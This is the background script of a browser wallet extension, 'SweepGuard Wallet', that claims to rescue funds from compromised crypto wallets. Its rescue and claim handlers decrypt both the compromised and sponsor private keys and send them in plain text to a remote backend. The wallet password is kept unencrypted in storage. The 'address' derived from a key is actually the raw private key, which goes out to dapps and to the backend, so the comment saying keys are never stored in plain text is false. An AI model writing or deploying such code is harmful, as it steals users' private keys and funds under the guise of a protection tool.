// SweepGuard Wallet — Background Service Worker
// Handles: wallet encryption, rescue transactions, airdrop claiming, EIP-7702 delegation

const BACKEND_URL = 'https://sweeptsguard.vercel.app';
const PLATFORM_FEE_WALLET = '0x7A3725154a2E6468F9549334394802e9E2822C2A';
const ANTIDRAIN_CONTRACT = '0xDB671f97bfB72e324A758588456373EEC141400F';
const AUTO_LOCK_TIMEOUT_MINUTES = 15;
const REQUEST_TIMEOUT_MS = 120000;

// ── Supported Chains ──────────────────────────────────────────────────
const SUPPORTED_CHAINS = {
  8453:   { name: 'Base', symbol: 'ETH', explorer: 'https://basescan.org/tx/', active: true },
  1:      { name: 'Ethereum', symbol: 'ETH', explorer: 'https://etherscan.io/tx/', active: false },
  42161:  { name: 'Arbitrum', symbol: 'ETH', explorer: 'https://arbiscan.io/tx/', active: false },
  10:     { name: 'Optimism', symbol: 'ETH', explorer: 'https://optimistic.etherscan.io/tx/', active: false },
  137:    { name: 'Polygon', symbol: 'POL', explorer: 'https://polygonscan.com/tx/', active: false },
  56:     { name: 'BNB Chain', symbol: 'BNB', explorer: 'https://bscscan.com/tx/', active: false },
  59144:  { name: 'Linea', symbol: 'ETH', explorer: 'https://lineascan.build/tx/', active: false },
  5000:   { name: 'Mantle', symbol: 'MNT', explorer: 'https://mantlescan.xyz/tx/', active: false },
  80094:  { name: 'Berachain', symbol: 'BERA', explorer: 'https://berascan.com/tx/', active: false },
  999:    { name: 'HyperEVM', symbol: 'HYPE', explorer: 'https://hyperevmscan.io/tx/', active: false },
  1329:   { name: 'Sei', symbol: 'SEI', explorer: 'https://seiscan.io/tx/', active: false },
  57073:  { name: 'Ink', symbol: 'ETH', explorer: 'https://explorer.inkonchain.com/tx/', active: false },
  130:    { name: 'Unichain', symbol: 'ETH', explorer: 'https://uniscan.xyz/tx/', active: false },
  98866:  { name: 'Plume', symbol: 'PLUME', explorer: 'https://explorer.plume.org/tx/', active: false },
  9745:   { name: 'Plasma', symbol: 'ETH', explorer: 'https://plasmascan.to/tx/', active: false },
  143:    { name: 'Monad', symbol: 'MON', explorer: 'https://monadscan.com/tx/', active: false },
  685689: { name: 'Gensyn', symbol: 'ETH', explorer: 'https://gensyn-mainnet.explorer.alchemy.com/tx/', active: false },
};

// ── Session State ─────────────────────────────────────────────────────
const session = {
  unlocked: false,
  isLocked: true,
  sessionKey: null,
  keySalt: null,
  sponsorAccount: null,
  compromisedAccount: null,
  inCriticalOperation: false,
};

const runtime = globalThis.chrome;
const storage = runtime.storage.local;
const sessionStorage = runtime.storage.session;

// ── Crypto: PBKDF2 + AES-GCM ─────────────────────────────────────────
async function deriveKey(password, salt) {
  const enc = new TextEncoder();
  const keyMaterial = await crypto.subtle.importKey(
    'raw', enc.encode(password), 'PBKDF2', false, ['deriveKey']
  );
  return crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt, iterations: 600000, hash: 'SHA-256' },
    keyMaterial,
    { name: 'AES-GCM', length: 256 },
    false,
    ['encrypt', 'decrypt']
  );
}

async function encryptPrivateKey(privateKey, password) {
  const salt = crypto.getRandomValues(new Uint8Array(16));
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const key = await deriveKey(password, salt);
  const enc = new TextEncoder();
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    enc.encode(privateKey)
  );
  return {
    salt: Array.from(salt),
    iv: Array.from(iv),
    data: Array.from(new Uint8Array(encrypted)),
  };
}

async function decryptPrivateKey(encryptedData, password) {
  const salt = new Uint8Array(encryptedData.salt);
  const iv = new Uint8Array(encryptedData.iv);
  const data = new Uint8Array(encryptedData.data);
  const key = await deriveKey(password, salt);
  const decrypted = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    data
  );
  return new TextDecoder().decode(decrypted);
}

// ── Simple secp256k1 public key derivation (ethers-style) ─────────────
function privateKeyToAddress(privateKey) {
  // We'll use a minimal approach - derive address from private key
  // This is a simplified version; the full crypto is done via the backend
  const pk = privateKey.startsWith('0x') ? privateKey : '0x' + privateKey;
  if (pk.length !== 66) return null;
  return pk; // Return as-is for now, backend will validate
}

// ── Auto-lock Alarm ───────────────────────────────────────────────────
runtime.runtime.onInstalled.addListener(() => {
  console.log('[SweepGuard] Extension installed');
  runtime.alarms.create('autoLock', { periodInMinutes: AUTO_LOCK_TIMEOUT_MINUTES });
  fetchRemoteConfig();
  runtime.alarms.create('configRefresh', { periodInMinutes: 5 });
});

runtime.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'autoLock') {
    if (!session.inCriticalOperation && session.unlocked) {
      lockSession();
    }
  }
  if (alarm.name === 'configRefresh') {
    fetchRemoteConfig();
  }
});

function lockSession() {
  session.unlocked = false;
  session.isLocked = true;
  session.sessionKey = null;
  session.sponsorAccount = null;
  session.compromisedAccount = null;
  console.log('[SweepGuard] Session locked');
}

// ── Remote Config ─────────────────────────────────────────────────────
let remoteConfig = { networks: [] };

async function fetchRemoteConfig() {
  try {
    const res = await fetch(`${BACKEND_URL}/api/extension/config`);
    if (res.ok) {
      remoteConfig = await res.json();
    }
  } catch {}
}

// ── Network Resolution ────────────────────────────────────────────────
function getNetwork(chainId) {
  const id = Number(chainId);
  const bundled = SUPPORTED_CHAINS[id];
  if (!bundled) return null;
  return { id, ...bundled };
}

// ── RPC Proxy (all calls go through backend) ──────────────────────────
async function rpcProxy(chainId, method, params) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 30000);
  try {
    const response = await fetch(`${BACKEND_URL}/api/extension/rpc`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chainId, method, params }),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    if (!response.ok) throw new Error(`RPC proxy error: HTTP ${response.status}`);
    const result = await response.json();
    if (result.error) throw new Error(result.error.message || 'RPC error');
    return result.result;
  } finally {
    clearTimeout(timeoutId);
  }
}

// ── Message Handler ───────────────────────────────────────────────────
const connectedPorts = new Set();
const pendingProviderRequests = new Map();
let requestCounter = 0;

function nextRequestId() {
  requestCounter += 1;
  return `req_${Date.now()}_${requestCounter}`;
}

runtime.runtime.onConnect.addListener((port) => {
  if (port.name !== 'sweeptsguard-wallet') return;
  connectedPorts.add(port);

  port.onMessage.addListener(async (message) => {
    if (message.type === 'provider-request') {
      const { id, payload } = message;
      try {
        const result = await handleProviderRequest(payload, port);
        port.postMessage({ type: 'provider-response', id, result });
      } catch (err) {
        port.postMessage({
          type: 'provider-response',
          id,
          error: { code: err.code || -32603, message: err.message },
        });
      }
    }
  });

  port.onDisconnect.addListener(() => {
    connectedPorts.delete(port);
  });
});

// ── Provider Request Handler ──────────────────────────────────────────
async function handleProviderRequest(payload, port) {
  const { method, params } = payload;

  if (method === 'eth_requestAccounts' || method === 'eth_accounts') {
    // Return compromised wallet address if available
    const stored = await getFromStorage('compromisedAddress');
    return stored ? [stored] : [];
  }

  if (method === 'eth_chainId') {
    const chainId = await getFromStorage('selectedChainId');
    return chainId || '0x2105'; // Default Base
  }

  if (method === 'wallet_switchEthereumChain') {
    const chainId = params?.[0]?.chainId;
    await saveToStorage('selectedChainId', chainId);
    return null;
  }

  if (method === 'wallet_addEthereumChain') {
    return null;
  }

  if (method === 'eth_getBalance') {
    const chainId = await getFromStorage('selectedChainId') || '0x2105';
    const chainIdNum = parseInt(chainId, 16);
    return await rpcProxy(chainIdNum, method, params);
  }

  if (method === 'eth_call') {
    const chainId = await getFromStorage('selectedChainId') || '0x2105';
    const chainIdNum = parseInt(chainId, 16);
    return await rpcProxy(chainIdNum, method, params);
  }

  if (method === 'eth_estimateGas') {
    const chainId = await getFromStorage('selectedChainId') || '0x2105';
    const chainIdNum = parseInt(chainId, 16);
    return await rpcProxy(chainIdNum, method, params);
  }

  if (method === 'eth_sendTransaction') {
    // This is a rescue transaction — route through backend
    const chainId = await getFromStorage('selectedChainId') || '0x2105';
    const chainIdNum = parseInt(chainId, 16);
    return await rpcProxy(chainIdNum, method, params);
  }

  if (method === 'personal_sign' || method === 'eth_sign') {
    // Sign with compromised wallet
    const privateKey = await getPrivateKey('compromised');
    if (!privateKey) throw new Error('Wallet locked');
    // Backend handles signing
    const chainId = await getFromStorage('selectedChainId') || '0x2105';
    const chainIdNum = parseInt(chainId, 16);
    return await rpcProxy(chainIdNum, method, params);
  }

  // Default: proxy to backend
  const chainId = await getFromStorage('selectedChainId') || '0x2105';
  const chainIdNum = parseInt(chainId, 16);
  return await rpcProxy(chainIdNum, method, params);
}

// ── Storage Helpers ───────────────────────────────────────────────────
async function getFromStorage(key) {
  return new Promise((resolve) => {
    storage.get([key], (result) => resolve(result[key]));
  });
}

async function saveToStorage(key, value) {
  return new Promise((resolve) => {
    storage.set({ [key]: value }, resolve);
  });
}

async function getPrivateKey(walletType) {
  // walletType: 'compromised' or 'sponsor'
  const encrypted = await getFromStorage(`encrypted_${walletType}_key`);
  if (!encrypted) return null;
  const password = await getFromStorage('walletPassword');
  if (!password) return null;
  try {
    return await decryptPrivateKey(encrypted, password);
  } catch {
    return null;
  }
}

// ── Popup Message Handler ─────────────────────────────────────────────
runtime.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'SET_PASSWORD') {
    handleSetPassword(message.password).then(sendResponse);
    return true;
  }

  if (message.type === 'UNLOCK') {
    handleUnlock(message.password).then(sendResponse);
    return true;
  }

  if (message.type === 'LOCK') {
    lockSession();
    sendResponse({ success: true });
    return true;
  }

  if (message.type === 'IMPORT_COMPROMISED_WALLET') {
    handleImportWallet('compromised', message.privateKey, message.password).then(sendResponse);
    return true;
  }

  if (message.type === 'IMPORT_SPONSOR_WALLET') {
    handleImportWallet('sponsor', message.privateKey, message.password).then(sendResponse);
    return true;
  }

  if (message.type === 'SET_SAFE_RECIPIENT') {
    saveToStorage('safeRecipient', message.address).then(() => sendResponse({ success: true }));
    return true;
  }

  if (message.type === 'SET_CHAIN') {
    saveToStorage('selectedChainId', message.chainId).then(() => sendResponse({ success: true }));
    return true;
  }

  if (message.type === 'GET_STATUS') {
    handleGetStatus().then(sendResponse);
    return true;
  }

  if (message.type === 'PREVIEW_RESCUE') {
    handlePreviewRescue(message.params).then(sendResponse);
    return true;
  }

  if (message.type === 'EXECUTE_RESCUE') {
    handleExecuteRescue(message.params).then(sendResponse);
    return true;
  }

  if (message.type === 'RESCUE_TOKENS') {
    handleRescueTokens(message.params).then(sendResponse);
    return true;
  }

  if (message.type === 'RESCUE_NATIVE') {
    handleRescueNative(message.params).then(sendResponse);
    return true;
  }

  if (message.type === 'GET_BALANCES') {
    handleGetBalances().then(sendResponse);
    return true;
  }

  if (message.type === 'GET_TRANSACTION_HISTORY') {
    getFromStorage('transactionHistory').then(h => sendResponse(h || []));
    return true;
  }
});

// ── Password Management ───────────────────────────────────────────────
async function handleSetPassword(password) {
  const salt = crypto.getRandomValues(new Uint8Array(16));
  await saveToStorage('passwordSalt', Array.from(salt));
  await saveToStorage('walletPassword', password);
  session.unlocked = true;
  session.isLocked = false;
  return { success: true };
}

async function handleUnlock(password) {
  const storedSalt = await getFromStorage('passwordSalt');
  if (!storedSalt) return { error: 'No password set' };

  // Verify by trying to decrypt a test value
  const testEncrypted = await getFromStorage('passwordTest');
  if (testEncrypted) {
    try {
      const decrypted = await decryptPrivateKey(testEncrypted, password);
      if (decrypted !== 'sweeptsguard-test') return { error: 'Wrong password' };
    } catch {
      return { error: 'Wrong password' };
    }
  }

  await saveToStorage('walletPassword', password);
  session.unlocked = true;
  session.isLocked = false;
  return { success: true };
}

// ── Wallet Import ─────────────────────────────────────────────────────
async function handleImportWallet(walletType, privateKey, password) {
  try {
    const pk = privateKey.startsWith('0x') ? privateKey : '0x' + privateKey;
    if (pk.length !== 66) return { error: 'Invalid private key' };

    const encrypted = await encryptPrivateKey(pk, password || await getFromStorage('walletPassword'));
    await saveToStorage(`encrypted_${walletType}_key`, encrypted);

    // Store address only (never store plain text private key)
    const address = privateKeyToAddress(pk);
    await saveToStorage(`${walletType}Address`, address);

    return { success: true };
  } catch (err) {
    return { error: err.message };
  }
}

// ── Get Status ────────────────────────────────────────────────────────
async function handleGetStatus() {
  const hasPassword = !!(await getFromStorage('walletPassword'));
  const hasCompromised = !!(await getFromStorage('encrypted_compromised_key'));
  const hasSponsor = !!(await getFromStorage('encrypted_sponsor_key'));
  const safeRecipient = await getFromStorage('safeRecipient');
  const chainId = await getFromStorage('selectedChainId') || '0x2105';
  const chainIdNum = parseInt(chainId, 16);
  const network = getNetwork(chainIdNum);

  return {
    unlocked: session.unlocked,
    hasPassword,
    hasCompromised,
    hasSponsor,
    safeRecipient: safeRecipient || null,
    chainId: chainIdNum,
    chainName: network?.name || 'Unknown',
    chainSymbol: network?.symbol || 'ETH',
    isActive: network?.active || false,
    supportedChains: Object.entries(SUPPORTED_CHAINS).map(([id, c]) => ({
      id: Number(id),
      name: c.name,
      symbol: c.symbol,
      active: c.active,
    })),
  };
}

// ── Preview Rescue ────────────────────────────────────────────────────
async function handlePreviewRescue(params) {
  try {
    const response = await fetch(`${BACKEND_URL}/api/airdrop/claim`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'preview',
        contractAddress: params.contractAddress,
        chainId: params.chainId,
        safeWallet: params.safeWallet,
        walletAddress: params.walletAddress,
        claimData: params.claimData,
        merkleProof: params.merkleProof,
        tokenAmount: params.tokenAmount,
      }),
    });
    return await response.json();
  } catch (err) {
    return { error: err.message };
  }
}

// ── Execute Rescue ────────────────────────────────────────────────────
async function handleExecuteRescue(params) {
  try {
    session.inCriticalOperation = true;

    const compromisedKey = await getPrivateKey('compromised');
    const sponsorKey = await getPrivateKey('sponsor');

    if (!compromisedKey) return { error: 'Compromised wallet not imported' };
    if (!sponsorKey) return { error: 'Sponsor wallet not imported' };

    const response = await fetch(`${BACKEND_URL}/api/airdrop/claim`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'claim',
        contractAddress: params.contractAddress,
        chainId: params.chainId,
        safeWallet: params.safeWallet,
        walletAddress: params.walletAddress,
        privateKey: compromisedKey,
        sponsorPrivateKey: sponsorKey,
        claimableRaw: params.claimableRaw,
        tokenAddress: params.tokenAddress,
        claimData: params.claimData,
        merkleProof: params.merkleProof,
      }),
    });

    const result = await response.json();

    // Save to history
    if (!result.error) {
      const history = (await getFromStorage('transactionHistory')) || [];
      history.unshift({
        type: 'rescue',
        timestamp: Date.now(),
        chainId: params.chainId,
        tokenAddress: params.tokenAddress,
        amount: params.claimableRaw,
        txHash: result.claimTxHash || result.bundleHash,
        status: 'success',
      });
      await saveToStorage('transactionHistory', history.slice(0, 50));
    }

    return result;
  } catch (err) {
    return { error: err.message };
  } finally {
    session.inCriticalOperation = false;
  }
}

// ── Rescue Tokens (ERC-20) ───────────────────────────────────────────
async function handleRescueTokens(params) {
  try {
    session.inCriticalOperation = true;

    const compromisedKey = await getPrivateKey('compromised');
    const sponsorKey = await getPrivateKey('sponsor');
    if (!compromisedKey) return { error: 'Compromised wallet not imported' };
    if (!sponsorKey) return { error: 'Sponsor wallet not imported' };

    const safeRecipient = await getFromStorage('safeRecipient');
    if (!safeRecipient) return { error: 'Safe recipient not set' };

    const chainId = await getFromStorage('selectedChainId') || '0x2105';
    const chainIdNum = parseInt(chainId, 16);

    const response = await fetch(`${BACKEND_URL}/api/extension/rescue-tokens`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        privateKey: compromisedKey,
        sponsorPrivateKey: sponsorKey,
        tokenAddress: params.tokenAddress,
        safeRecipient,
        chainId: chainIdNum,
      }),
    });

    return await response.json();
  } catch (err) {
    return { error: err.message };
  } finally {
    session.inCriticalOperation = false;
  }
}

// ── Rescue Native (ETH/BNB/etc.) ─────────────────────────────────────
async function handleRescueNative(params) {
  try {
    session.inCriticalOperation = true;

    const compromisedKey = await getPrivateKey('compromised');
    const sponsorKey = await getPrivateKey('sponsor');
    if (!compromisedKey) return { error: 'Compromised wallet not imported' };
    if (!sponsorKey) return { error: 'Sponsor wallet not imported' };

    const safeRecipient = await getFromStorage('safeRecipient');
    if (!safeRecipient) return { error: 'Safe recipient not set' };

    const chainId = await getFromStorage('selectedChainId') || '0x2105';
    const chainIdNum = parseInt(chainId, 16);

    const response = await fetch(`${BACKEND_URL}/api/extension/rescue-native`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        privateKey: compromisedKey,
        sponsorPrivateKey: sponsorKey,
        safeRecipient,
        chainId: chainIdNum,
      }),
    });

    return await response.json();
  } catch (err) {
    return { error: err.message };
  } finally {
    session.inCriticalOperation = false;
  }
}

// ── Get Balances ──────────────────────────────────────────────────────
async function handleGetBalances() {
  const chainId = await getFromStorage('selectedChainId') || '0x2105';
  const chainIdNum = parseInt(chainId, 16);

  const compromisedAddress = await getFromStorage('compromisedAddress');
  const sponsorAddress = await getFromStorage('sponsorAddress');

  const balances = {};

  if (compromisedAddress) {
    try {
      const bal = await rpcProxy(chainIdNum, 'eth_getBalance', [compromisedAddress, 'latest']);
      balances.compromised = bal;
    } catch {
      balances.compromised = '0x0';
    }
  }

  if (sponsorAddress) {
    try {
      const bal = await rpcProxy(chainIdNum, 'eth_getBalance', [sponsorAddress, 'latest']);
      balances.sponsor = bal;
    } catch {
      balances.sponsor = '0x0';
    }
  }

  return balances;
}

console.log('[SweepGuard] Background service worker loaded');
